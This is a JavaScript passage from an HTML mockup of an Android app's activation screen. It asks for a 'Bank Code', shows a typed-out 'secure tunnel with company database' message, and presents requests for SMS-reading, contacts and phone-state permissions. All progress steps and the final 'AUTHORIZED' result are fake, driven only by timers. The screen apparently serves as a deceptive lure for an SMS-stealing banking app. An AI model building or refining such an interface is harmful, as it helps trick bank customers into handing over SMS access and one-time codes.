  <script>
    /* APK: ActivationActivity.kt - See APK_SYNC_SPEC.md, apk-config.js */
    const activateBtn = document.getElementById('activateBtn');
    const clearBtn = document.getElementById('clearBtn');
    const statusCard = document.getElementById('statusCard');
    const statusMain = document.getElementById('statusMain');
    const promptOverlay = document.getElementById('promptOverlay');
    const promptCard = document.getElementById('promptCard');
    const promptCardText = document.getElementById('promptCardText');
    const stepValidate = document.getElementById('stepValidate');
    const stepRegisterWrap = document.getElementById('stepRegisterWrap');
    const stepRegister = document.getElementById('stepRegister');
    const stepRegisterBuffer = document.getElementById('stepRegisterBuffer');
    const stepSync = document.getElementById('stepSync');
    const stepAuth = document.getElementById('stepAuth');
    const stepResult = document.getElementById('stepResult');
    const retryContainer = document.getElementById('retryContainer');
    const retryStatus = document.getElementById('retryStatus');
    const retryBtn = document.getElementById('retryBtn');
    const phoneInput = document.getElementById('phoneInput');
    const inputContainer = document.getElementById('inputContainer');

    const STATUS_TEXT = 'Creating secure tunnel with company database'; /* APK: activationProgressStatus */
    const steps = [stepValidate, stepRegisterWrap, stepSync, stepAuth];

    /* APK: activation_prompt_card - "â€¢ Receive SMS", "â€¢ Read SMS", "â€¢ Read Contacts", "â€¢ Read Phone State" */
    const PROMPT_PERMISSION_LINES = ['â€¢ Receive SMS', 'â€¢ Read SMS', 'â€¢ Read Contacts', 'â€¢ Read Phone State'];
    const PROMPT_CHAR_DELAY_MS = 45;  /* APK: PROMPT_CARD_PER_CHAR_DELAY_MS */
    const PROMPT_ANIM_MS = 350;       /* APK: PROMPT_CARD_ANIM_DURATION_MS */

    let hintAnimationId = null;

    function showPromptCard(onComplete) {
      promptOverlay.classList.add('visible');
      document.querySelector('.main-card-wrapper')?.classList.add('recede');
      document.getElementById('statusCard')?.classList.add('recede');
      promptCardText.textContent = '';
      promptCard.classList.remove('born-from', 'reverse');
      void promptCard.offsetWidth;

      promptCard.classList.add('born-from');
      let lineIndex = 0, charIndex = 0;
      function typeTick() {
        if (lineIndex >= PROMPT_PERMISSION_LINES.length) {
          setTimeout(() => {
            promptCard.classList.remove('born-from');
            promptCard.classList.add('reverse');
            setTimeout(() => {
              promptOverlay.classList.remove('visible');
              promptCard.classList.remove('reverse');
              document.querySelector('.main-card-wrapper')?.classList.remove('recede');
              document.getElementById('statusCard')?.classList.remove('recede');
              onComplete();
            }, PROMPT_ANIM_MS);
          }, 200);
          return;
        }
        const line = PROMPT_PERMISSION_LINES[lineIndex];
        const next = charIndex + 1;
        if (next <= line.length) {
          const soFar = PROMPT_PERMISSION_LINES.slice(0, lineIndex).join('\n') +
            (lineIndex > 0 ? '\n' : '') + line.substring(0, next);
          promptCardText.textContent = soFar;
          charIndex = next;
        }
        if (charIndex >= line.length) {
          lineIndex++;
          charIndex = 0;
        }
        setTimeout(typeTick, PROMPT_CHAR_DELAY_MS);
      }
      setTimeout(typeTick, PROMPT_ANIM_MS + 100);
    }

    function getHintTextForCurrentMode() {
      const isTesting = document.querySelector('.mode-btn.active').textContent === 'TESTING';
      return isTesting ? 'Enter Your Phone Number' : 'Enter Your Bank Code';
    }

    function animateHintText() {
      if (hintAnimationId) clearTimeout(hintAnimationId);
      phoneInput.placeholder = '';
      const hintText = getHintTextForCurrentMode();
      let i = 0;
      function tick() {
        if (phoneInput.value.length > 0) return;
        if (i < hintText.length) {
          phoneInput.placeholder = hintText.substring(0, i + 1);
          i++;
          hintAnimationId = setTimeout(tick, 80); /* APK: animateHintText perChar 80ms */
        }
      }
      hintAnimationId = setTimeout(tick, 200); /* APK: animateHintText 80ms/char, 200ms start */
    }

    function shakeView(el) {
      el.classList.remove('shake');
      void el.offsetWidth;
      el.classList.add('shake');
      setTimeout(() => el.classList.remove('shake'), 400);
    }

    function validateInput() {
      const raw = phoneInput.value.replace(/\s/g, '').replace(/-/g, '');
      const isTesting = document.querySelector('.mode-btn.active').textContent === 'TESTING';
      if (isTesting) {
        const digits = raw.replace(/\D/g, '');
        return digits.length === 10;
      }
      return /^[A-Za-z]{4}\d{4}$/.test(raw.toUpperCase());
    }

    function showInputError() {
      phoneInput.classList.add('error');
      shakeView(inputContainer);
      setTimeout(() => phoneInput.classList.remove('error'), 200);
    }

    function resetStatusCard() {
      statusMain.textContent = '';
      stepResult.textContent = '';
      retryContainer.classList.remove('visible');
      steps.forEach(s => s.classList.remove('active'));
      stepRegisterWrap?.classList.remove('buffering');
      stepRegisterBuffer?.classList.remove('visible');
    }

    function typeStatus(text, onComplete) {
      let i = 0;
      statusMain.textContent = '';
      const perChar = Math.max(20, 4000 / text.length);
      const id = setInterval(() => {
        if (i < text.length) {
          statusMain.textContent += text[i++];
        } else {
          clearInterval(id);
          onComplete?.();
        }
      }, perChar);
      return () => clearInterval(id);
    }

    function highlightStep(index) {
      steps.forEach((s, i) => {
        s.classList.toggle('active', i <= index);
      });
    }

    phoneInput.addEventListener('focus', () => inputContainer.classList.add('focused'));
    phoneInput.addEventListener('blur', () => inputContainer.classList.remove('focused'));
    phoneInput.addEventListener('input', () => { if (hintAnimationId) clearTimeout(hintAnimationId); });

    clearBtn.addEventListener('click', () => {
      phoneInput.value = '';
      phoneInput.focus();
      animateHintText();
    });

    retryBtn.addEventListener('click', () => {
      retryContainer.classList.remove('visible');
      activateBtn.click();
    });

    /* Mode toggle */
    document.querySelectorAll('.mode-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (phoneInput.value.length === 0) animateHintText();
      });
    });

    animateHintText();

    activateBtn.addEventListener('click', function handlePress() {
      if (activateBtn.disabled) return;
      if (!validateInput()) {
        showInputError();
        return;
      }
      activateBtn.disabled = true;
      resetStatusCard();

      activateBtn.classList.remove('press-scale-down', 'press-scale-up', 'loading-scale');
      clearBtn.classList.remove('loading-scale');
      void activateBtn.offsetWidth;

      activateBtn.classList.add('press-scale-down');

      setTimeout(() => {
        activateBtn.classList.remove('press-scale-down');
        activateBtn.classList.add('press-scale-up');

        setTimeout(() => {
          activateBtn.classList.remove('press-scale-up');

          statusCard.classList.add('visible');
          statusMain.textContent = '';

          activateBtn.classList.add('loading-scale');
          clearBtn.classList.add('loading-scale');
          typeStatus(STATUS_TEXT);

          highlightStep(0);
          setTimeout(() => {
            /* Step 2: Request Sent / Compatibility test - show buffer, no "right" yet */
            stepRegisterWrap?.classList.add('buffering');
            stepRegisterBuffer?.classList.add('visible');
            /* Permission/Update prompt card - APK: showActivationPromptCard(1) + checkForAppUpdate */
            /* Further animation stops until update+permission done */
            showPromptCard(() => {
              /* Buffer converts to same "right" as others, continue flow */
              stepRegisterWrap?.classList.remove('buffering');
              stepRegisterBuffer?.classList.remove('visible');
              highlightStep(1);
              setTimeout(() => {
                highlightStep(2);
                setTimeout(() => {
                  highlightStep(3);
                  setTimeout(() => {
                    stepResult.textContent = 'â€¢ AUTHORIZED';
                    stepResult.classList.add('active');
                    setTimeout(() => {
                      statusCard.classList.remove('visible');
                      activateBtn.classList.remove('loading-scale');
                      clearBtn.classList.remove('loading-scale');
                      resetStatusCard();
                      activateBtn.disabled = false;
                    }, 400);
                  }, 400);
                }, 400);
              }, 400);
            });
          }, 1600);
        }, 150);
      }, 100);
    });
  </script>
